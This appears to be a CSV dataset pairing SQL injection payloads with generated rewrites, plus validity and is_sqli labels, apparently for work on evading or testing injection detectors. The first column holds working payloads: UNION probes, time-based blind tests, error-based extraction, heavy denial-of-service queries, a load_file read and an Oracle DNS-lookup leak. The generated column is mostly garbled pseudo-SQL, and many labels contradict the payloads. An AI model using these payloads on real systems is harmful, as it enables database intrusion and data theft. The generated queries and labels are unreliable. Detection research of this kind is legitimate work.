original_query,generated_query,validity,is_sqli
"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",SELECT MIN(sqbaa) FROM SQL injection,1,0
"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",SELECT MIN(sql injection) FROM SQL_injection,1,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,1
1'  )   where 5378  =  5378,SELECT MIN(5378 = 5378) FROM SQL injection,1,0
select   (  case when   (  3672  =  8360  )   then 3672 else 3672*  (  select 3672 from information_schema.character_sets  )   end  )  #,"SELECT 3672 FROM SQL AS _valid_sq_inject_sq_searcher WHERE 3672 = 8360 - then 3672 = 3672* (SELECT query_schema.character_sets FROM query_schema.character_sets ) FROM query:SELECT query_schema.character_sets FROM query:SELECT query_schema.character_sets FROM query:SELECT query_schema.character_sets FROM query: SUM(SQL) FROM 3672 WHERE NOT SELECT SELECT MIN(sql_inject = ""SQ injection""",1,0
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe","SELECT MIN(6055 ='sq injection') FROM SQL SELECT MIN(6055 = 'ctxsys.drithsx.sn','sql injection'",1,1
1' where 3337  =  3337 and 8403  =  5760,SELECT MIN(sql injection) FROM SQL SELECT MIN(3337 = 3337 AND 8403 = 5760,1,1
1'  )   where 2090  =  2090,SELECT MIN(2090 = 2090) FROM SQL injection,1,0
-5982' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ikuh'  =  'ikuh,SELECT MIN(sql injection) FROM SQL -5982 ORDER BY ikuh,1,0
1 and 1=1,SELECT * FROM query: 1 AND NOT SQL_inject = 1,1,1
"1""  )  ",SELECT MIN(sql injection) FROM SQL injection,1,0
"1'   )    )    as atpy where 9020  =  9020 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL_injection WHERE 9020 = 9020 OR 4915 = 4915 = (SELECT MIN(*) FROM SQL_injection),1,1
"1""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""ladc"" like ""ladc",SELECT MIN(sql injection) FROM SQL injection,1,0
"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",SELECT MIN(sql injection) FROM SQL - evade SQL injection detection,1,0
1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,SELECT MIN(sql injection) FROM SQL_injection,1,0
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr",SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection' FROM SQL ORDER BY 'gxpr',1,0
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20delay%20'0:20'%20--) FROM SQL injection,1,1
"1   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  5199  =  5199",SELECT MIN(5199 = 5199) FROM SQL_Injection,1,1
"select count  (  *  )   from generate_series  (  1,5000000  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM query_series WHERE NOT SELECT MIN(1,5000000) FROM generate_series",1,1
1%'   )    )    and 9198  =  9198--,SELECT MIN(9198 = 9198--) FROM SQL injection,1,1
"-9996' or make_set  (  1237  =  7111,7111  )  ","SELECT MIN(1237 = 7111,7111) FROM SQL injection",1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0
' or '1'='1,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0
select case when 4488  =  5522 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL_injection WHERE 4488 = 5522 AND NOT SELECT SELECT DISTINCT end-- end--,1,1
"' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",SELECT DISTINCT if(load_file(load_file(load_file(load_file)) FROM SQL injection,1,0
1'  )   as ulbr where 7233  =  7233 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0
"-1174"" union all select 4303,4303,4303,4303#",SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -1174,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",SELECT MIN(SELECT) FROM SQL_inject_address WHERE NOT SELECT FROM SQL_inject_name AND NOT i'= 'evade',0,0
1'   )    )     )   union all select null#,SELECT NOT SELECT DISTINCT null# FROM SQL injection,1,0
1   )    )     )   union all select null--,SELECT NOT SQL_injection FROM SQL_Injection,1,0
ORDER BY 11#,"SELECT * FROM 11# AND NOT SQL_inject = ""valid""",1,0
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1##@ union select 'a',version ( ) -- 1",1,1
"1""  )   as doai where 7024  =  7024 union all select null,null,null,null,null,null,null,null--","SELECT MIN(sql) FROM SQL injection, evade SQL injection detection",1,0
1  )   and 2457  =  8146,SELECT * FROM query: 1 JOIN SQL injection = 2457 AND NOT SQL_injection = 2457,0,0
"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""wute"" like ""wute",SELECT DISTINCT (wute) FROM SQL injection),1,0
"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","SELECT MIN(*) FROM SQL_injection WHERE NOT all_users = ""esq injection detection""",1,0
"1"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL_injection WHERE NOT sysibm.systables = ""t1,sysibm.systables as t2,sysibm.systables as t3 = ""7417 = ""EXCEPT""",1,1
"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",SELECT MIN(SQL) FROM SQL_Injection,1,0
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '","SELECT MIN(7513 = 8586,8586 ) FROM SQL injection",1,1
" select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1","SELECT * FROM * FROM SQL_injections WHERE id = 1 OR ""1;"" = 1 OR 1 = 1",1,0
"1%'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  '%'  =  '","SELECT MIN(excat) FROM SQL, SELECT 0x5c, MIN(excat) FROM SQL injection",1,1
-2983'  )   or 8571  =  8571--,SELECT MIN(sql injection) FROM SQL_injection,1,0
"1""   )    )     )   union all select null,null,null,null,null--","SELECT null,null,null,null,null,null-- FROM SQL SELECT MIN(sql injection) FROM SQL",1,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8#",SELECT MIN(sql injection) FROM SQL_injection,1,0
1'   )    )    as joco where 2922  =  2922,SELECT MIN(2922 = 2922) FROM SQL injection,1,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  ""","SELECT * FROM (SELECT * FROM query WHERE NOT SQL_injection = ""valid"" AND NOT hex ( randomblob ( 500000000000/2 ) = ""valid""",1,1
"1'+  (  select sged where 1181  =  1181 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",SELECT MIN(*) FROM SQL_Injection WHERE 1181 = 1181 OR 1152 = 1181 OR NOT STRFT$Collations = 7552 = (SELECT MIN(*) FROM SQL_Injection),1,1
"')) and 0=benchmark(3000000,MD5(1))%20/*","SELECT MIN(3000000,MD5(1))%20/*) FROM SQL injection",1,1
select case when 8227  =  1229 then 1 else null end--,SELECT MIN(1 ORDER BY SQL_injection) DESC LIMIT 1,1,0
"iif  (  2840  =  3788,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,0
"-8436'  )   as frmf where 7225  =  7225 or make_set  (  9354  =  9354,7185  )  --",SELECT MIN(7185) FROM SQL_injection,1,0
pg_sleep  (  __TIME__  )  --,"SELECT * FROM query: pg_sleep WHERE NOT __TIME__ = ""valid""",1,0
" select * from users where id  =  '1' +   (  \.  )   union select 1,@@VERSION -- 1'",SELECT * FROM * FROM users WHERE NOT id = '1' ORDER BY id = '1',1,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""qkat""  =  ""qkat","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3 AND ((qkat) = 'evade sq injection')",1,1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","SELECT MIN(3000000,MD5(1)) FROM SQL injection AS t1 JOIN 'evade SQL injection'",0,1
"""))) waitfor delay '0:0:20' --",SELECT NOT SQL_inject FROM query: '0:0:20',1,0
"' union select * from users where login = char(114,111,111,116);",SELECT MIN(sql injection) FROM SQL_injection,1,0
ORDER BY 19--,"SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT SQL FROM query WHERE NOT SQL_inject = ""valid"" AND query: ORDER BY 19--",1,0
1 and 1=1,SELECT * FROM query: 1 AND NOT SQL_inject = 1,1,1
1%'   )    )    and 7989  =  3457,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
"-9057""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(0x71706a71, 0x7171706a71, 0x717a71, 0x717a767a71, 0x717a71, 0x717a7, 0x717a71, 0x717a7, 0 FROM SQL injection JOIN (SELECT MIN(4 ) FROM SQL SELECT MIN(4 ) FROM SQL SELECT MIN(4 ) ='sql injection') - 9057')",1,1
"-7323%"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL,1,0
admin' or 1  =  1--,SELECT MIN(1 = 1 FROM SQL injection),1,1
INSERT INTO Documents WHERE ID=x,SELECT query: SELECT SQL FROM documents WHERE ID = 'evade detection',1,0
"1""  )   as lgxc where 1117  =  1117 union all select null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM evade SQL injection,1,0
"-6220' union all select 1462,1462#",SELECT MIN(SQL injection) FROM SQL_Injection,1,0
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',SELECT * FROM * FROM SQL_injection WHERE id = '1' OR 1 = 1,1,0
"1""  )   as frmp where 6073  =  6073",SELECT MIN(6073 = 6073) FROM SQL injection,1,0
"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#","SELECT 7745,7745,7745,7745# FROM SQL SELECT 7745,7745,7745,7745# FROM 7745,7745 WHERE NOT 7745 = 'evade SQL injection detection'",1,1
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ","SELECT MIN(*) FROM SQL_injection WHERE NOT all_users = ""esq injection detection""",1,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  '","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3 AND % = 'evade SQL injection'",1,1
SELECT COUNT(*) FROM game;,"SELECT query: SELECT COUNT(*) FROM game;sql = ""sq injection"" AND NOT SELECT FROM query: SELECT COUNT(*) FROM query: SELECT FROM query: SELECT COUNT(*) FROM game;",1,0
""",NULL)%20waitfor%20delay%20'0:0:20'%20/*","SELECT * FROM query: "",NULL)%20delay%20'0:20'%20/*"" FROM query: ""sql injection"" FROM query: ""sql""",1,1
"-3666""   )    )     )   union all select 4136,4136,4136--",SELECT MIN(sql injection) FROM SQL_injection,1,0
1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',SELECT SELECT 'ovlx' FROM SQL injection',1,0
-6109 union all select 6784--,SELECT 6784-- FROM SQL_Injection AS _evade_sq_injection,1,0
ORDER BY 29#,"SELECT * FROM 29# WHERE NOT SQL_injection = ""valid""",1,0
1  )   as selm where 5759  =  5759,"SELECT MIN(5759 = 5759) FROM query: 1 JOIN SQL injection' = ""valid""",0,1
-1217'   )    )     )   order by 1#,SELECT MIN(1#) FROM SQL injection,1,1
"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""dtwv"" like ""dtwv","SELECT DISTINCT, swift_injection FROM SQL_injection WHERE NOT char(= 1) ORDER BY dtwv",1,0
1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,SELECT MIN(sgvo) FROM SQL injection,1,0
"1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",SELECT MIN(sql injection) FROM SQL_Injection WHERE 6374 = 6374 ORDER BY elt ( 1045 = 30551 union select 1210,1,1
"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""oxxi""  =  ""oxxi","SELECT MIN(*) FROM SQL_injection, COUNT(*) FROM SQL_injection)",1,0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection,1,0
"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_injection WHERE STRFTIME('%y', '%sql injection') = '1134 = 1134' AND NOT STRFTIME('%y', '%8635 = (SELECT MIN(1,5000000) FROM generate_series)",0,1
-4785' or   (  8459  =  8459  )  *4906 and 'esfn'  =  'esfn,SELECT MIN(8459 = 8459) FROM SQL injection,1,1
"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#","SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT SELECT DISTINCT system FROM SQL SELECT 3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280, SQL_Injection FROM SELECT SUM(SQL) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL Query: -6463""",1,0
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  4976  =  4976","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection)",1,0
select   (  case when   (  8993  =  8846  )   then 8993 else 8993*  (  select 8993 from mysql.db  )   end  )  #,"SELECT 8993 FROM mysql.db ) FROM SQL AS _valid_sQL_0, SELECT 8993 FROM mysql.db )",1,1
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'yxpi'  =  'yxpi,SELECT DISTINCT (SQL injection) FROM SQL_Injection) ORDER BY syst_injection,1,0
-3598  )   union all select 2264#,SELECT DISTINCT esq injection FROM SQL_injection,1,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'pshn' like 'pshn",SELECT * FROM SQL_injection WHERE NOT rdb$types = 'evade' AND NOT rdb$collations = 't4 and ( (SELECT * FROM SQL_injection),0,1
"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",SELECT MIN(5037 = 5037) FROM SQL injection,1,1
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",SELECT MIN(*) FROM SQL injection,1,0
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia","SELECT 6793 FROM pg_sleep WHERE NOT 6793 = ""evade SQL injection detection"" ORDER BY 6793",0,0
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'dtym'  =  'dtym",SELECT MIN(success_injection) FROM SQL_injection,1,0
1%'  )   and 9226  =  7542--,SELECT MIN(SQL) FROM SQL injection,1,0
select   (  case when   (  9907  =  2736  )   then 9907 else 9907*  (  select 9907 from mysql.db  )   end  )  #,SELECT 9907 FROM mysql.db ) FROM NOT SQL_inject SQL_inject ORDER BY 9907,0,1
"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT NOT SQL_engineered FROM SQL WHERE 5048 = 5048 OR NOT char(= 100 ) ||char ( 99 ) ORDER BY NOT SQL_engineered,1,1
"1  )   where 5385  =  5385 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_Injection WHERE NOT sysusers = ""5385 = 5385 ORDER BY sysusers as sys4,sysusers as sys7 = ""evade""",1,0
1'  )   where 1183  =  1183,SELECT MIN(1183 = 1183) FROM SQL injection,1,1
"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",SELECT * FROM SQL_injection WHERE NOT rdb$types = 'evade',1,0
-7772'   )    )    or 9323  =  9323#,SELECT MIN(9323 = 9323#) FROM SQL injection,1,1
"1""   )    )    as nhus where 3689  =  3689",SELECT MIN(3689 = 3689) FROM SQL injection,1,0
"1%'   )    )     )   union all select null,null,null,null#","SELECT DISTINCT null,null,null FROM SQL SELECT MIN(sql injection) FROM SQL",1,0
"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",SELECT MIN(sqdut) FROM SQL injection,1,0
"1   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --","SELECT * FROM chr WHERE NOT SQL_injection = ""valid"" ORDER BY chr ( 87 )",1,0
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",SELECT MIN((((((((((((()) FROM SQL injection) FROM SQL injection),1,1
"-5026' where 7324  =  7324 union all select 7324,7324--",SELECT MIN(SQL injection) FROM SQL_Injection,1,0
"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--",SELECT MIN(sql) FROM SQL injection,1,0
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--","SELECT MIN(6189,6189,6189,6189,6189,6189-- FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL",1,1
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'bdsq' like 'bdsq",SELECT MIN(sq) FROM SQL injection,1,0
"1""   )    )    as dksq where 7161  =  7161",SELECT MIN(sql) FROM SQL injection,1,0
"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#","SELECT MIN(sql injection) FROM 7845,7845,7845,7845,7845# FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM SELECT 7845,7845,7845,7845,7845# FROM Query: -3370",1,1
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --","SELECT 6793 FROM pg_sleep WHERE ""sql injection"" = ""evade"" ORDER BY 6793 = ""sql injection""",1,0
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",SELECT MIN(excat) FROM SQL_Injection WHERE NOT md5 ( 0x4b774c75 ) = 'evade sq injection',1,1
"1'  )   and elt  (  3528  =  3566,3566  )  ","SELECT MIN(3528 = 3566,3566) FROM SQL injection",1,1
"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm","SELECT MIN(*) FROM SQL_injection, COUNT(*) FROM SQL_injection)",1,0
"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  ""","SELECT MIN(s) FROM SQL injection, COUNT(*) FROM SQL_Injection",1,0
1'||  (  select 'sliy' where 9494  =  9494,SELECT SELECT'sliy' FROM SQL injection',1,0
"-2377%'   )    )     )   union all select 7706,7706--","SELECT MIN(sql injection) FROM SQL SELECT 7706,7706-- FROM SQL_Injection",1,1
"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,SELECT MIN(*) FROM SQL injection,1,0
"1""   )    )    or sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection,1,1
